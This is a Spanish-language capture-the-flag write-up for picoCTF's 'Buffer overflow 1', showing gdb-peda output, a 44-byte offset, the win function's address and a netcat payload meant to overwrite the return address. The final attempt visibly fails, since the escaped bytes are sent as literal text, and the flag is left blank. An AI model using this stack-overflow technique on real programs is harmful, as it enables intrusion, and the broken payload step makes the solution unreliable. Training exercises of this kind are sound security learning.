# Buffer overflow 1


## Descripcion
Control the return addressNow we're cooking! You can overflow the buffer and return to the flag function in the [program](https://artifacts.picoctf.net/c/186/vuln).You can view source [here](https://artifacts.picoctf.net/c/186/vuln.c). And connect with it using `nc saturn.picoctf.net 50024`
## Pistas
Make sure you consider big Endian vs small Endian.
Changing the address of the return pointer can call different functions.

## Solucion
descargamos gbd peda de https://github.com/longld/peda
usamos 
pattern 100 para generar 100 caracteres y los pasamos en la ejecucion 
nos da el resultado
```
Warning: 'set logging on', an alias for the command 'set logging enabled', is deprecated.
Use 'set logging enabled on'.

[----------------------------------registers-----------------------------------]
EAX: 0x41 ('A')
EBX: 0x61414145 ('EAAa')
ECX: 0x0 
EDX: 0xf7fc2540 (0xf7fc2540)
ESI: 0x8049350 (<__libc_csu_init>:      endbr32)
EDI: 0xf7ffcb80 --> 0x0 
EBP: 0x41304141 ('AA0A')
ESP: 0xffffd020 ("bAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
EIP: 0x41414641 ('AFAA')
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41414641
[------------------------------------stack-------------------------------------]
0000| 0xffffd020 ("bAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0004| 0xffffd024 ("AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0008| 0xffffd028 ("AcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0012| 0xffffd02c ("2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0016| 0xffffd030 ("AAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0020| 0xffffd034 ("A3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0024| 0xffffd038 ("IAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0028| 0xffffd03c ("AA4AAJAAfAA5AAKAAgAA6AAL")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41414641 in ?? ()
gdb-peda$ 

```
buscamos el offset que coinsida con el numero 0x41414641 en este caso AFAA
ejecutamos pattern offset AFAA y nos devuelve 44

posteriormente desesamblamos la funcion win para obtener su retorno en este caso
```
gdb-peda$ disass win
Dump of assembler code for function win:
   0x080491f6 <+0>:     endbr32

```
con python y la libreria pwn ejecutamos 
p32(0x080491f6) y  nos da la direccion de memoria
\xf6\x91\x04\x08
asi que ejecutamos el netcat creando 44 caractteres mas la direccion de memoria la bandera
(AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf6\x91\x04\x08) y obtenemos la bandera

## Bandera
robert@DESKTOP-Q7059O3:/mnt/c/Windows/system32$ nc saturn.picoctf.net 58660
Please enter your string:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf6\x91\x04\x08
Okay, time to return... Fingers Crossed... Jumping to 0x3666785c
robert@DESKTOP-Q7059O3:/mnt/c/Windows/system32$

aqui  deberia imprimirla pero por alguna razon no lo hace :( ninguna solucion que se intento imprime la bandera incluyendo e video proporcionado
picoCTF{}
## Notas adicionales


## Referencias
